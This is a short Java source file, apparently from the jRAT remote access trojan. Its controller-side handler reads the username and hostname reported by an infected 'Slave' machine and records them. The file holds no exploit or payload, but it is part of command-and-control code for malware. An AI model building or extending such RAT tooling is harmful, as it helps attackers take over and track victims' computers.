package jrat.controller.packets.incoming;

import jrat.controller.Slave;


public class Packet5InitUserHost implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		String username = slave.readLine();
		String hostname = slave.readLine();
		
		slave.setUsername(username);
		slave.setHostname(hostname);
	}

}
